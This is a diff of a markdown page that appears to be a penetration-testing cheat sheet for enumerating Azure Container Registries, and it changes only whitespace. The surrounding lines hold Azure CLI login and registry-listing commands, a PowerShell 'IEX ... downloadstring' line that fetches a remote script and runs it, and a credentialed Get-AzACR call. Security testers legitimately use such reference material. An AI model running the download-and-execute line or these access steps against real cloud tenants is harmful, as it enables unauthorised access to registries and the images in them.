@@ -2,7 +2,7 @@
 
 ## Enumerate
 
-List container registries in the subscription using Azure CLI 
+List container registries in the subscription using Azure CLI
 
 ```ps1
 az login -u user@domain.onmicrosoft.com -p pass
@@ -25,6 +25,7 @@ az acr repository list -n $acr
 ```
 
 List version tags for an image
+
 ```ps1
 az acr repository show-tags -n $acr --repository mywebapp
 ```
@@ -46,7 +47,6 @@ IEX (New-Object Net.WebClient).downloadstring("https://raw.githubusercontent.com
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Internet Explorer\Main" -Name "DisableFirstRunCustomize" -Value 2
 Get-AzACR -username ${username} -password ${password} -registry ${registryURI}
 ```
-
 
 ## References
 
